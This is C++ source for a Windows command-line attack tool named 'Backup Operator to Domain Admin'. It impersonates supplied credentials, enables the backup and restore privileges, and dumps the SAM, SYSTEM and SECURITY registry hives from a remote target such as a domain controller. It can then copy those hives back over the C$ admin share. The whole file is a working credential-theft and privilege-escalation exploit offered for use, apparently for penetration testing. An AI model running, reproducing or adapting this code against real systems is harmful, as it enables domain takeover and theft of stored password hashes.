// BackupOperatorToDA.cpp
// all code and credit from https://twitter.com/filip_dragovic
// https://raw.githubusercontent.com/Wh04m1001/Random/main/BackupOperators.cpp
// I just wanted to have a more generic binary with parameters etc

#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <string>
#include <tchar.h>
#include <winnetwk.h>
#pragma comment(lib, "Mpr.lib")

LPCSTR user = NULL;
LPCSTR password = NULL;
LPCSTR domain = NULL;
LPCSTR path = NULL;      // remote path on target (e.g. "C:\\Windows\\Temp\\")
LPCSTR target = NULL;    // e.g. "\\\\AD01.lab.local"
LPCSTR localOutput = NULL; // -lo local output folder

DWORD MakeToken();

static void PrintLastError(const char* prefix, DWORD code) {
	char* msg = nullptr;
	FormatMessageA(
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, code, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPSTR)&msg, 0, NULL);
	if (msg) {
		printf("%s: %lu - %s", prefix, code, msg);
		LocalFree(msg);
	}
	else {
		printf("%s: %lu\n", prefix, code);
	}
}

// Use generic LPCTSTR so SE_BACKUP_NAME / SE_RESTORE_NAME (which may be wide) match.
static BOOL EnablePrivilegeOnToken(HANDLE token, LPCTSTR privName) {
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, privName, &luid)) {
		PrintLastError("LookupPrivilegeValue failed", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		PrintLastError("AdjustTokenPrivileges failed", GetLastError());
		return FALSE;
	}
	DWORD last = GetLastError();
	if (last != ERROR_SUCCESS) {
		PrintLastError("AdjustTokenPrivileges reported error", last);
		return FALSE;
	}
	return TRUE;
}

// Try to enable privileges on the thread token (if impersonating) or process token.
static void EnableBackupRestorePrivileges() {
	HANDLE token = NULL;
	if (OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &token)) {
		EnablePrivilegeOnToken(token, SE_BACKUP_NAME);
		EnablePrivilegeOnToken(token, SE_RESTORE_NAME);
		CloseHandle(token);
		return;
	}
	// fallback to process token
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
		EnablePrivilegeOnToken(token, SE_BACKUP_NAME);
		EnablePrivilegeOnToken(token, SE_RESTORE_NAME);
		CloseHandle(token);
		return;
	}
	PrintLastError("OpenThreadToken/OpenProcessToken failed", GetLastError());
}

DWORD MakeToken() {
	HANDLE token;

	if (LogonUserA(user, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &token) == 0) {
		PrintLastError("LogonUserA failed", GetLastError());
		exit(0);
	}
	if (ImpersonateLoggedOnUser(token) == 0) {
		PrintLastError("ImpersonateLoggedOnUser failed", GetLastError());
		CloseHandle(token);
		exit(0);
	}
	// After impersonating, enable backup/restore if possible on the impersonation token/thread.
	EnableBackupRestorePrivileges();

	// keep impersonation active for RegSaveKey; close token handle
	CloseHandle(token);
	return 0;
}

static std::string StripLeadingBackslashes(const std::string& s) {
	size_t i = 0;
	while (i < s.size() && (s[i] == '\\' || s[i] == '/')) ++i;
	return s.substr(i);
}

// Build UNC path to the saved hive on target given target and remote `path` and hive name.
// Handles remote path that is "C:\\some\\dir\\" or "\\\\share\\dir\\".
static std::string RemoteHivePath(const std::string& host, const std::string& remotePath, const std::string& hiveName) {
	// if remotePath starts with '\\' treat it as UNC share already
	if (!remotePath.empty() && (remotePath[0] == '\\' || remotePath[0] == '/')) {
		std::string p = remotePath;
		// ensure trailing backslash
		if (p.back() != '\\' && p.back() != '/') p.append("\\");
		// replace leading single backslash with double (should already be UNC)
		return p + hiveName;
	}
	// if path starts with drive letter like "C:" or "C:\"
	if (remotePath.size() >= 2 && remotePath[1] == ':') {
		char drive = remotePath[0];
		// remove "C:" from path
		std::string rel = remotePath.substr(2);
		// strip leading slashes
		while (!rel.empty() && (rel[0] == '\\' || rel[0] == '/')) rel.erase(0, 1);
		std::string unc = std::string("\\\\") + host + "\\" + drive + "$\\";
		if (!rel.empty()) {
			unc += rel;
			// ensure trailing backslash
			if (unc.back() != '\\' && unc.back() != '/') unc.append("\\");
		}
		unc += hiveName;
		return unc;
	}
	// fallback: assume path is relative -> use C$ by default
	std::string p = std::string("\\\\") + host + "\\C$\\";
	if (!remotePath.empty()) {
		std::string rel = remotePath;
		while (!rel.empty() && (rel[0] == '\\' || rel[0] == '/')) rel.erase(0, 1);
		p += rel;
		if (p.back() != '\\' && p.back() != '/') p.append("\\");
	}
	p += hiveName;
	return p;
}

static BOOL DownloadHivesFromTarget() {
	if (!localOutput) return TRUE; // nothing to do

	std::string host = StripLeadingBackslashes(std::string(target));
	// If target contains backslash after hostname, only take hostname portion
	size_t idx = host.find('\\');
	if (idx != std::string::npos) host = host.substr(0, idx);
	// Also strip possible trailing domain component? keep full FQDN if present.

	// Prepare credentials for WNetAddConnection2A
	NETRESOURCEA nr;
	ZeroMemory(&nr, sizeof(nr));
	std::string remoteAdminShare = std::string("\\\\") + host + "\\C$";
	nr.dwType = RESOURCETYPE_DISK;
	nr.lpRemoteName = const_cast<LPSTR>(remoteAdminShare.c_str());
	nr.lpLocalName = NULL;
	nr.lpProvider = NULL;

	// build username for remote connection: domain\user or user
	std::string username;
	if (domain && user) {
		username = std::string(domain) + "\\" + std::string(user);
	}
	else if (user) {
		username = std::string(user);
	}

	DWORD rc = WNetAddConnection2A(&nr, password, username.empty() ? NULL : username.c_str(), 0);
	if (rc != NO_ERROR && rc != ERROR_SESSION_CREDENTIAL_CONFLICT) {
		PrintLastError("WNetAddConnection2A failed", rc);
		// continue and try to copy files anyway (may fail)
	}

	const char* hives[] = { "SAM", "SYSTEM", "SECURITY" };
	for (int i = 0; i < 3; ++i) {
		std::string hive = hives[i];
		std::string remoteFile = RemoteHivePath(host, path ? std::string(path) : std::string("C:\\Windows\\Temp\\"), hive);
		std::string local = std::string(localOutput);
		// ensure separator
		if (!local.empty()) {
			char last = local[local.length() - 1];
			if (last != '\\' && last != '/') local.append("\\");
		}
		local.append(hive);
		printf("Downloading %s -> %s\n", remoteFile.c_str(), local.c_str());
		if (!CopyFileA(remoteFile.c_str(), local.c_str(), FALSE)) {
			PrintLastError("CopyFileA failed", GetLastError());
			// continue to next file
		}
	}

	// Disconnect admin share
	WNetCancelConnection2A(remoteAdminShare.c_str(), 0, TRUE);
	return TRUE;
}

void exploit() {

	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives[] = { "SAM","SYSTEM","SECURITY" };

	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
		PrintLastError("RegConnectRegistryA failed", result);
		exit(0);
	}
	for (int i = 0; i < 3; i++) {
		std::string out = std::string(path);
		// ensure separator between path and hive name if not present
		if (!out.empty()) {
			char last = out[out.length() - 1];
			if (last != '\\' && last != '/') out.append("\\");
		}
		out.append(hives[i]);
		printf("Dumping %s hive to %s\n", hives[i], out.c_str());
		result = RegOpenKeyExA(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
		if (result != 0) {
			PrintLastError("RegOpenKeyExA failed", result);
			exit(0);
		}
		result = RegSaveKeyA(hkey, out.c_str(), NULL);
		if (result != 0) {
			PrintLastError("RegSaveKeyA failed", result);
			exit(0);
		}
		RegCloseKey(hkey);
	}
	RegCloseKey(hklm);

	// after saving on remote target, optionally download files to localOutput
	if (localOutput) {
		DownloadHivesFromTarget();
	}
}

void PrintUsage()
{
	wprintf(
		L"\n"
		"Backup Operator to Domain Admin (by @mpgn_x64)\n"
		"\n"
		"  This tool exist thanks to @filip_dragovic / https://github.com/Wh04m1001 \n"
		"\n"
	);

	wprintf(
		L"Mandatory argument:\n"
		"  -t <TARGET>      \\\\computer_name (ex: \\\\dc01.pouldard.wizard)\n"
		"  -o <PATH>        Where to store the sam / system / security files on the target (e.g. C:\\Windows\\Temp\\)\n"
		"\n"
		"Optional arguments:\n"
		"\n"
		"  -u <USER>        Username\n"
		"  -p <PASSWORD>    Password\n"
		"  -d <DOMAIN>      Domain\n"
		"  -lo <LOCALOUT>   Local output folder to download the saved hives to (after remote save)\n"
		"  -h               help\n"
		"\n"
	);
}

int main(int argc, char* argv[])
{
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		// handle multi-char option "-lo"
		if (strcmp(argv[1], "-lo") == 0) {
			++argv; --argc;
			if (argc > 1 && argv[1][0] != '-') {
				localOutput = argv[1];
			}
			else {
				printf("[-] Missing value for option: -lo\n");
				PrintUsage();
				return -1;
			}
			++argv; --argc;
			continue;
		}

		switch (argv[1][1])
		{
		case 'h':
			PrintUsage();
			return 0;
		case 'u':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				user = argv[1];
			}
			else
			{
				printf("[-] Missing value for option: -u\n");
				PrintUsage();
				return -1;
			}
			break;
		case 'p':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				password = argv[1];
			}
			else
			{
				printf("[-] Missing value for option: -p\n");
				PrintUsage();
				return -1;
			}
			break;
		case 'd':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				domain = argv[1];
			}
			else
			{
				printf("[-] Missing value for option: -d\n");
				PrintUsage();
				return -1;
			}
			break;
		case 'o':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				path = argv[1];
			}
			else
			{
				printf("[-] Missing value for option: -o\n");
				PrintUsage();
				return -1;
			}
			break;
		case 't':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				target = argv[1];
			}
			else
			{
				printf("[-] Missing value for option: -t\n");
				PrintUsage();
				return -1;
			}
			break;
		default:
			printf("[-] Invalid argument: %s\n", argv[1]);
			PrintUsage();
			return -1;
		}
		++argv;
		--argc;
	}
	if (target == NULL || path == NULL) {
		printf("[-] Missing argument -t or -o\n");
		exit(0);
	}
	if (target[0] != '\\') {
		printf("[-] Target should start with \\\\\n");
		exit(0);
	}

	if (domain && user && password) {
		printf("Making user token\n");
		MakeToken();
	}
	else {
		// Even if not impersonating, try enabling backup/restore on current process token.
		EnableBackupRestorePrivileges();
	}

	exploit();

	return 0;
}